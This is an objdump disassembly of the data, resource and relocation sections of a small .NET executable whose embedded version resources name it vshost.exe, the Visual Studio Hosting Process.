  402ea7:	add    dl,BYTE PTR [esi]
  402ea9:	push   edi
  402eaa:	jb     0x402f0d
  402eac:	jo     0x402efc
  402eae:	outs   dx,DWORD PTR ds:[esi]
  402eaf:	outs   dx,BYTE PTR ds:[esi]
  402eb0:	inc    ebp
  402eb1:	js     0x402f16
  402eb3:	gs jo  0x402f2a
  402eb6:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  402ebd:	ja     0x402f32
  402ebf:	add    DWORD PTR [eax],ecx
  402ec1:	add    DWORD PTR [eax],eax
  402ec3:	add    al,BYTE PTR [eax]
  402ec5:	add    BYTE PTR [eax],al
  402ec7:	add    BYTE PTR [eax],al
  402ec9:	or     BYTE PTR [ecx],al
  402ecb:	add    BYTE PTR [eax],cl
	...
  402ed5:	add    BYTE PTR [eax],al
  402ed7:	add    BYTE PTR [ebp-0x2c],al
  402eda:	adc    DWORD PTR [eax+0x0],edx
  402edd:	add    BYTE PTR [eax],al
  402edf:	add    BYTE PTR [edx],al
  402ee1:	add    BYTE PTR [eax],al
  402ee3:	add    BYTE PTR [ecx+eax*1],bl
  402ee6:	add    BYTE PTR [eax],al
  402ee8:	lock add BYTE PTR cs:[eax],al
  402eec:	lock adc BYTE PTR [eax],al
  402eef:	add    BYTE PTR [edx+0x53],dl
  402ef2:	inc    esp
  402ef3:	push   ebx
  402ef4:	or     edx,ebx
  402ef6:	pop    esp
  402ef7:	push   0x4abd4498
  402efc:	mov    edi,DWORD PTR [eax-0x3e]
  402eff:	aad    0x3
  402f01:	dec    ebp
  402f03:	inc    esp
  402f04:	add    DWORD PTR [eax],eax
  402f06:	add    BYTE PTR [eax],al
  402f08:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  402f0d:	outs   dx,BYTE PTR ds:[esi]
  402f0e:	popa   
  402f0f:	jb     0x402f7a
  402f11:	gs jae 0x402f70
  402f14:	dec    ecx
  402f15:	outs   dx,BYTE PTR ds:[esi]
  402f16:	je     0x402f7d
  402f18:	jb     0x402f87
  402f1a:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  402f23:	jo     0x402f97
  402f25:	outs   dx,DWORD PTR ds:[esi]
  402f26:	push   0x65
  402f28:	arpl   WORD PTR [esp+ebx*2+0x76],si
  402f2c:	jae    0x402f96
  402f2e:	outs   dx,DWORD PTR ds:[esi]
  402f2f:	jae    0x402fa5
  402f31:	outs   dx,BYTE PTR ds:[esi]
  402f32:	gs jne 0x402fa9
  402f35:	jb     0x402f98
  402f37:	ins    BYTE PTR es:[edi],dx
  402f38:	arpl   WORD PTR cs:[ebx+0x70],si
  402f3c:	jb     0x402fad
  402f3e:	push   0x5f
  402f40:	pop    edi
  402f41:	xor    eax,0x36383032
  402f46:	xor    dh,BYTE PTR [esi]
  402f48:	cmp    DWORD PTR [ecx],esi
  402f4a:	pop    esp
  402f4b:	outs   dx,DWORD PTR ds:[esi]
  402f4c:	bound  ebp,QWORD PTR [edx+0x72]
  402f4f:	pop    esp
  402f50:	js     0x402f8a
  402f52:	ss pop esp
  402f54:	jbe    0x402fc9
  402f56:	push   0x2e74736f
  402f5b:	jo     0x402fc1
  402f5d:	bound  eax,QWORD PTR [eax]
	...
  40300b:	add    BYTE PTR [eax+esi*1],dh
	...
  403016:	add    BYTE PTR [eax],al
  403018:	dec    esi
  403019:	xor    BYTE PTR [eax],al
  40301b:	add    BYTE PTR [eax],al
  40301d:	and    BYTE PTR [eax],al
	...
  403033:	add    BYTE PTR [eax+0x30],al
	...
  403042:	pop    edi
  403043:	inc    ebx
  403044:	outs   dx,DWORD PTR ds:[esi]
  403045:	jb     0x40308c
  403047:	js     0x4030ae
  403049:	dec    ebp
  40304a:	popa   
  40304b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403052:	jb     0x4030b9
  403054:	gs cs fs ins BYTE PTR es:[edi],dx
  403058:	ins    BYTE PTR es:[edi],dx
  403059:	add    BYTE PTR [eax],al
  40305b:	add    BYTE PTR [eax],al
  40305d:	add    bh,bh
  40305f:	and    eax,0x402000

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    BYTE PTR [eax],al
  40400e:	add    DWORD PTR [eax],eax
  404010:	adc    BYTE PTR [eax],al
  404012:	add    BYTE PTR [eax],al
  404014:	sbb    BYTE PTR [eax],al
  404016:	add    BYTE PTR [eax+0x0],al
	...
  404024:	add    BYTE PTR [eax],al
  404026:	add    DWORD PTR [eax],eax
  404028:	add    DWORD PTR [eax],eax
  40402a:	add    BYTE PTR [eax],al
  40402c:	xor    BYTE PTR [eax],al
  40402e:	add    BYTE PTR [eax+0x0],al
	...
  40403c:	add    BYTE PTR [eax],al
  40403e:	add    DWORD PTR [eax],eax
  404040:	add    BYTE PTR [eax],al
  404042:	add    BYTE PTR [eax],al
  404044:	dec    eax
  404045:	add    BYTE PTR [eax],al
  404047:	add    BYTE PTR [eax+0x40],bl
  40404a:	add    BYTE PTR [eax],al
  40404c:	test   al,0x3
	...
  404056:	add    BYTE PTR [eax],al
  404058:	test   al,0x3
  40405a:	xor    al,0x0
  40405c:	add    BYTE PTR [eax],al
  40405e:	push   esi
  40405f:	add    BYTE PTR [ebx+0x0],dl
  404062:	pop    edi
  404063:	add    BYTE PTR [esi+0x0],dl
  404066:	inc    ebp
  404067:	add    BYTE PTR [edx+0x0],dl
  40406a:	push   ebx
  40406b:	add    BYTE PTR [ecx+0x0],cl
  40406e:	dec    edi
  40406f:	add    BYTE PTR [esi+0x0],cl
  404072:	pop    edi
  404073:	add    BYTE PTR [ecx+0x0],cl
  404076:	dec    esi
  404077:	add    BYTE PTR [esi+0x0],al
  40407a:	dec    edi
  40407b:	add    BYTE PTR [eax],al
  40407d:	add    BYTE PTR [eax],al
  40407f:	add    BYTE PTR [ebp+0xfeef04],bh
  404085:	add    BYTE PTR [ecx],al
  404087:	add    BYTE PTR [eax],al
  404089:	add    BYTE PTR [ebx],cl
  40408b:	add    BYTE PTR [ecx],al
  40408d:	add    BYTE PTR [edi],ah
  40408f:	mov    BYTE PTR [eax],0x0
  404092:	or     eax,DWORD PTR [eax]
  404094:	add    DWORD PTR [eax],eax
  404096:	daa    
  404097:	(bad)  
  404098:	aas    
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax],al
  40409d:	add    BYTE PTR [eax],al
  40409f:	add    BYTE PTR [eax+eax*1],al
  4040a2:	add    BYTE PTR [eax],al
  4040a4:	add    DWORD PTR [eax],eax
	...
  4040b2:	add    BYTE PTR [eax],al
  4040b4:	inc    esp
  4040b5:	add    BYTE PTR [eax],al
  4040b7:	add    BYTE PTR [ecx],al
  4040b9:	add    BYTE PTR [esi+0x0],dl
  4040bc:	popa   
  4040bd:	add    BYTE PTR [edx+0x0],dh
  4040c0:	inc    esi
  4040c1:	add    BYTE PTR [ecx+0x0],ch
  4040c4:	ins    BYTE PTR es:[edi],dx
  4040c5:	add    BYTE PTR [ebp+0x0],ah
  4040c8:	dec    ecx
  4040c9:	add    BYTE PTR [esi+0x0],ch
  4040cc:	data16 add BYTE PTR [edi+0x0],ch
  4040d0:	add    BYTE PTR [eax],al
  4040d2:	add    BYTE PTR [eax],al
  4040d4:	and    al,0x0
  4040d6:	add    al,0x0
  4040d8:	add    BYTE PTR [eax],al
  4040da:	push   esp
  4040db:	add    BYTE PTR [edx+0x0],dh
  4040de:	popa   
  4040df:	add    BYTE PTR [esi+0x0],ch
  4040e2:	jae    0x4040e4
  4040e4:	ins    BYTE PTR es:[edi],dx
  4040e5:	add    BYTE PTR [ecx+0x0],ah
  4040e8:	je     0x4040ea
  4040ea:	imul   eax,DWORD PTR [eax],0x6e006f
  4040f0:	add    BYTE PTR [eax],al
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	add    BYTE PTR [eax],al
  4040f6:	mov    al,0x4
  4040f8:	or     BYTE PTR [ebx],al
  4040fa:	add    BYTE PTR [eax],al
  4040fc:	add    DWORD PTR [eax],eax
  4040fe:	push   ebx
  4040ff:	add    BYTE PTR [eax+eax*1+0x72],dh
  404103:	add    BYTE PTR [ecx+0x0],ch
  404106:	outs   dx,BYTE PTR ds:[esi]
  404107:	add    BYTE PTR [edi+0x0],ah
  40410a:	inc    esi
  40410b:	add    BYTE PTR [ecx+0x0],ch
  40410e:	ins    BYTE PTR es:[edi],dx
  40410f:	add    BYTE PTR [ebp+0x0],ah
  404112:	dec    ecx
  404113:	add    BYTE PTR [esi+0x0],ch
  404116:	data16 add BYTE PTR [edi+0x0],ch
  40411a:	add    BYTE PTR [eax],al
  40411c:	in     al,0x2
  40411e:	add    BYTE PTR [eax],al
  404120:	add    DWORD PTR [eax],eax
  404122:	xor    BYTE PTR [eax],al
  404124:	xor    BYTE PTR [eax],al
  404126:	xor    BYTE PTR [eax],al
  404128:	xor    BYTE PTR [eax],al
  40412a:	xor    BYTE PTR [eax],al
  40412c:	xor    al,0x0
  40412e:	bound  eax,QWORD PTR [eax]
  404130:	xor    BYTE PTR [eax],al
  404132:	add    BYTE PTR [eax],al
  404134:	xor    BYTE PTR [eax],al
  404136:	or     eax,DWORD PTR [eax]
  404138:	add    DWORD PTR [eax],eax
  40413a:	inc    ebx
  40413b:	add    BYTE PTR [edi+0x0],ch
  40413e:	ins    DWORD PTR es:[edi],dx
  40413f:	add    BYTE PTR [ebp+0x0],ch
  404142:	add    BYTE PTR gs:[esi+0x0],ch
  404146:	je     0x404148
  404148:	jae    0x40414a
  40414a:	add    BYTE PTR [eax],al
  40414c:	jbe    0x40414e
  40414e:	jae    0x404150
  404150:	push   0x73006f00
  404155:	add    BYTE PTR [eax+eax*1+0x2e],dh
  404159:	add    BYTE PTR [ebp+0x0],ah
  40415c:	js     0x40415e
  40415e:	add    BYTE PTR gs:[eax],al
  404161:	add    BYTE PTR [eax],al
  404163:	add    BYTE PTR [eax+eax*1+0x16],cl
  404167:	add    BYTE PTR [ecx],al
  404169:	add    BYTE PTR [ebx+0x0],al
  40416c:	outs   dx,DWORD PTR ds:[esi]
  40416d:	add    BYTE PTR [ebp+0x0],ch
  404170:	jo     0x404172
  404172:	popa   
  404173:	add    BYTE PTR [esi+0x0],ch
  404176:	jns    0x404178
  404178:	dec    esi
  404179:	add    BYTE PTR [ecx+0x0],ah
  40417c:	ins    DWORD PTR es:[edi],dx
  40417d:	add    BYTE PTR [ebp+0x0],ah
  404180:	add    BYTE PTR [eax],al
  404182:	add    BYTE PTR [eax],al
  404184:	dec    ebp
  404185:	add    BYTE PTR [ecx+0x0],ch
  404188:	arpl   WORD PTR [eax],ax
  40418a:	jb     0x40418c
  40418c:	outs   dx,DWORD PTR ds:[esi]
  40418d:	add    BYTE PTR [ebx+0x0],dh
  404190:	outs   dx,DWORD PTR ds:[esi]
  404191:	add    BYTE PTR [esi+0x0],ah
  404194:	je     0x404196
  404196:	and    BYTE PTR [eax],al
  404198:	inc    ebx
  404199:	add    BYTE PTR [edi+0x0],ch
  40419c:	jb     0x40419e
  40419e:	jo     0x4041a0
  4041a0:	outs   dx,DWORD PTR ds:[esi]
  4041a1:	add    BYTE PTR [edx+0x0],dh
  4041a4:	popa   
  4041a5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4041a9:	add    BYTE PTR [edi+0x0],ch
  4041ac:	outs   dx,BYTE PTR ds:[esi]
  4041ad:	add    BYTE PTR [eax],al
  4041af:	add    BYTE PTR [eax+0x0],al
  4041b2:	or     eax,DWORD PTR [eax]
  4041b4:	add    DWORD PTR [eax],eax
  4041b6:	inc    esi
  4041b7:	add    BYTE PTR [ecx+0x0],ch
  4041ba:	ins    BYTE PTR es:[edi],dx
  4041bb:	add    BYTE PTR [ebp+0x0],ah
  4041be:	inc    esp
  4041bf:	add    BYTE PTR [ebp+0x0],ah
  4041c2:	jae    0x4041c4
  4041c4:	arpl   WORD PTR [eax],ax
  4041c6:	jb     0x4041c8
  4041c8:	imul   eax,DWORD PTR [eax],0x740070
  4041ce:	imul   eax,DWORD PTR [eax],0x6e006f
  4041d4:	add    BYTE PTR [eax],al
  4041d6:	add    BYTE PTR [eax],al
  4041d8:	jbe    0x4041da
  4041da:	jae    0x4041dc
  4041dc:	push   0x73006f00
  4041e1:	add    BYTE PTR [eax+eax*1+0x2e],dh
  4041e5:	add    BYTE PTR [ebp+0x0],ah
  4041e8:	js     0x4041ea
  4041ea:	add    BYTE PTR gs:[eax],al
  4041ed:	add    BYTE PTR [eax],al
  4041ef:	add    BYTE PTR [eax+eax*1],bh
  4041f2:	or     eax,0x46000100
  4041f7:	add    BYTE PTR [ecx+0x0],ch
  4041fa:	ins    BYTE PTR es:[edi],dx
  4041fb:	add    BYTE PTR [ebp+0x0],ah
  4041fe:	push   esi
  4041ff:	add    BYTE PTR [ebp+0x0],ah
  404202:	jb     0x404204
  404204:	jae    0x404206
  404206:	imul   eax,DWORD PTR [eax],0x6e006f
  40420c:	add    BYTE PTR [eax],al
  40420e:	add    BYTE PTR [eax],al
  404210:	xor    DWORD PTR [eax],eax
  404212:	xor    DWORD PTR [eax],eax
  404214:	add    BYTE PTR cs:[eax],dh
  404217:	add    BYTE PTR [esi],ch
  404219:	add    BYTE PTR ds:0x37003000,dh
  40421f:	add    BYTE PTR [edx],dh
  404221:	add    BYTE PTR [edi],dh
  404223:	add    BYTE PTR [esi],ch
  404225:	add    BYTE PTR [ecx],dh
  404227:	add    BYTE PTR [eax],al
  404229:	add    BYTE PTR [eax],al
  40422b:	add    BYTE PTR [eax],bh
  40422d:	add    BYTE PTR [ebx],cl
  40422f:	add    BYTE PTR [ecx],al
  404231:	add    BYTE PTR [ecx+0x0],cl
  404234:	outs   dx,BYTE PTR ds:[esi]
  404235:	add    BYTE PTR [eax+eax*1+0x65],dh
  404239:	add    BYTE PTR [edx+0x0],dh
  40423c:	outs   dx,BYTE PTR ds:[esi]
  40423d:	add    BYTE PTR [ecx+0x0],ah
  404240:	ins    BYTE PTR es:[edi],dx
  404241:	add    BYTE PTR [esi+0x0],cl
  404244:	popa   
  404245:	add    BYTE PTR [ebp+0x0],ch
  404248:	add    BYTE PTR gs:[eax],al
  40424b:	add    BYTE PTR [esi+0x0],dh
  40424e:	jae    0x404250
  404250:	push   0x73006f00
  404255:	add    BYTE PTR [eax+eax*1+0x2e],dh
  404259:	add    BYTE PTR [ebp+0x0],ah
  40425c:	js     0x40425e
  40425e:	add    BYTE PTR gs:[eax],al
  404261:	add    BYTE PTR [eax],al
  404263:	add    BYTE PTR [eax+0x1002e00],al
  404269:	add    BYTE PTR [eax+eax*1+0x65],cl
  40426d:	add    BYTE PTR [edi+0x0],ah
  404270:	popa   
  404271:	add    BYTE PTR [eax+eax*1+0x43],ch
  404275:	add    BYTE PTR [edi+0x0],ch
  404278:	jo     0x40427a
  40427a:	jns    0x40427c
  40427c:	jb     0x40427e
  40427e:	imul   eax,DWORD PTR [eax],0x680067
  404284:	je     0x404286
  404286:	add    BYTE PTR [eax],al
  404288:	test   eax,0x4d002000
  40428d:	add    BYTE PTR [ecx+0x0],ch
  404290:	arpl   WORD PTR [eax],ax
  404292:	jb     0x404294
  404294:	outs   dx,DWORD PTR ds:[esi]
  404295:	add    BYTE PTR [ebx+0x0],dh
  404298:	outs   dx,DWORD PTR ds:[esi]
  404299:	add    BYTE PTR [esi+0x0],ah
  40429c:	je     0x40429e
  40429e:	and    BYTE PTR [eax],al
  4042a0:	inc    ebx
  4042a1:	add    BYTE PTR [edi+0x0],ch
  4042a4:	jb     0x4042a6
  4042a6:	jo     0x4042a8
  4042a8:	outs   dx,DWORD PTR ds:[esi]
  4042a9:	add    BYTE PTR [edx+0x0],dh
  4042ac:	popa   
  4042ad:	add    BYTE PTR [eax+eax*1+0x69],dh
  4042b1:	add    BYTE PTR [edi+0x0],ch
  4042b4:	outs   dx,BYTE PTR ds:[esi]
  4042b5:	add    BYTE PTR [esi],ch
  4042b7:	add    BYTE PTR [eax],ah
  4042b9:	add    BYTE PTR [ecx+0x0],al
  4042bc:	ins    BYTE PTR es:[edi],dx
  4042bd:	add    BYTE PTR [eax+eax*1+0x20],ch
  4042c1:	add    BYTE PTR [edx+0x0],dh
  4042c4:	imul   eax,DWORD PTR [eax],0x680067
  4042ca:	je     0x4042cc
  4042cc:	jae    0x4042ce
  4042ce:	and    BYTE PTR [eax],al
  4042d0:	jb     0x4042d2
  4042d2:	add    BYTE PTR gs:[ebx+0x0],dh
  4042d6:	add    BYTE PTR gs:[edx+0x0],dh
  4042da:	jbe    0x4042dc
  4042dc:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4042e1:	add    BYTE PTR [eax],al
  4042e3:	add    BYTE PTR [eax+0x0],al
  4042e6:	or     eax,DWORD PTR [eax]
  4042e8:	add    DWORD PTR [eax],eax
  4042ea:	dec    edi
  4042eb:	add    BYTE PTR [edx+0x0],dh
  4042ee:	imul   eax,DWORD PTR [eax],0x690067
  4042f4:	outs   dx,BYTE PTR ds:[esi]
  4042f5:	add    BYTE PTR [ecx+0x0],ah
  4042f8:	ins    BYTE PTR es:[edi],dx
  4042f9:	add    BYTE PTR [esi+0x0],al
  4042fc:	imul   eax,DWORD PTR [eax],0x65006c
  404302:	outs   dx,BYTE PTR ds:[esi]
  404303:	add    BYTE PTR [ecx+0x0],ah
  404306:	ins    DWORD PTR es:[edi],dx
  404307:	add    BYTE PTR [ebp+0x0],ah
  40430a:	add    BYTE PTR [eax],al
  40430c:	jbe    0x40430e
  40430e:	jae    0x404310
  404310:	push   0x73006f00
  404315:	add    BYTE PTR [eax+eax*1+0x2e],dh
  404319:	add    BYTE PTR [ebp+0x0],ah
  40431c:	js     0x40431e
  40431e:	add    BYTE PTR gs:[eax],al
  404321:	add    BYTE PTR [eax],al
  404323:	add    BYTE PTR [eax+0x0],ah
  404326:	pop    ds
  404327:	add    BYTE PTR [ecx],al
  404329:	add    BYTE PTR [eax+0x0],dl
  40432c:	jb     0x40432e
  40432e:	outs   dx,DWORD PTR ds:[esi]
  40432f:	add    BYTE PTR [eax+eax*1+0x75],ah
  404333:	add    BYTE PTR [ebx+0x0],ah
  404336:	je     0x404338
  404338:	dec    esi
  404339:	add    BYTE PTR [ecx+0x0],ah
  40433c:	ins    DWORD PTR es:[edi],dx
  40433d:	add    BYTE PTR [ebp+0x0],ah
  404340:	add    BYTE PTR [eax],al
  404342:	add    BYTE PTR [eax],al
  404344:	dec    ebp
  404345:	add    BYTE PTR [ecx+0x0],ch
  404348:	arpl   WORD PTR [eax],ax
  40434a:	jb     0x40434c
  40434c:	outs   dx,DWORD PTR ds:[esi]
  40434d:	add    BYTE PTR [ebx+0x0],dh
  404350:	outs   dx,DWORD PTR ds:[esi]
  404351:	add    BYTE PTR [esi+0x0],ah
  404354:	je     0x404356
  404356:	scas   al,BYTE PTR es:[edi]
  404357:	add    BYTE PTR [eax],ah
  404359:	add    BYTE PTR [esi+0x0],dl
  40435c:	imul   eax,DWORD PTR [eax],0x750073
  404362:	popa   
  404363:	add    BYTE PTR [eax+eax*1+0x20],ch
  404367:	add    BYTE PTR [ebx+0x0],dl
  40436a:	je     0x40436c
  40436c:	jne    0x40436e
  40436e:	add    BYTE PTR fs:[ecx+0x0],ch
  404372:	outs   dx,DWORD PTR ds:[esi]
  404373:	add    BYTE PTR [esi+0x32002000],ch
  404379:	add    BYTE PTR [eax],dh
  40437b:	add    BYTE PTR [ecx],dh
  40437d:	add    BYTE PTR [edx],dh
  40437f:	add    BYTE PTR [eax],al
  404381:	add    BYTE PTR [eax],al
  404383:	add    BYTE PTR [eax+0x0],al
  404386:	or     eax,0x50000100
  40438b:	add    BYTE PTR [edx+0x0],dh
  40438e:	outs   dx,DWORD PTR ds:[esi]
  40438f:	add    BYTE PTR [eax+eax*1+0x75],ah
  404393:	add    BYTE PTR [ebx+0x0],ah
  404396:	je     0x404398
  404398:	push   esi
  404399:	add    BYTE PTR [ebp+0x0],ah
  40439c:	jb     0x40439e
  40439e:	jae    0x4043a0
  4043a0:	imul   eax,DWORD PTR [eax],0x6e006f
  4043a6:	add    BYTE PTR [eax],al
  4043a8:	xor    DWORD PTR [eax],eax
  4043aa:	xor    DWORD PTR [eax],eax
  4043ac:	add    BYTE PTR cs:[eax],dh
  4043af:	add    BYTE PTR [esi],ch
  4043b1:	add    BYTE PTR ds:0x37003000,dh
  4043b7:	add    BYTE PTR [edx],dh
  4043b9:	add    BYTE PTR [edi],dh
  4043bb:	add    BYTE PTR [esi],ch
  4043bd:	add    BYTE PTR [ecx],dh
  4043bf:	add    BYTE PTR [eax],al
  4043c1:	add    BYTE PTR [eax],al
  4043c3:	add    BYTE PTR [eax+eax*1],bh
  4043c6:	or     DWORD PTR [eax],eax
  4043c8:	add    DWORD PTR [eax],eax
  4043ca:	inc    ecx
  4043cb:	add    BYTE PTR [ebx+0x0],dh
  4043ce:	jae    0x4043d0
  4043d0:	add    BYTE PTR gs:[ebp+0x0],ch
  4043d4:	bound  eax,QWORD PTR [eax]
  4043d6:	ins    BYTE PTR es:[edi],dx
  4043d7:	add    BYTE PTR [ecx+0x0],bh
  4043da:	and    BYTE PTR [eax],al
  4043dc:	push   esi
  4043dd:	add    BYTE PTR [ebp+0x0],ah
  4043e0:	jb     0x4043e2
  4043e2:	jae    0x4043e4
  4043e4:	imul   eax,DWORD PTR [eax],0x6e006f
  4043ea:	add    BYTE PTR [eax],al
  4043ec:	xor    DWORD PTR [eax],eax
  4043ee:	xor    DWORD PTR [eax],eax
  4043f0:	add    BYTE PTR cs:[eax],dh
  4043f3:	add    BYTE PTR [esi],ch
  4043f5:	add    BYTE PTR [eax],dh
  4043f7:	add    BYTE PTR [esi],ch
  4043f9:	add    BYTE PTR [eax],dh
  4043fb:	add    BYTE PTR [eax],al
  4043fd:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00406000 <.reloc>:
  406000:	add    BYTE PTR [eax],dh
  406002:	add    BYTE PTR [eax],al
  406004:	or     al,0x0
  406006:	add    BYTE PTR [eax],al
  406008:	pusha  
  406009:	xor    BYTE PTR [eax],al
	...
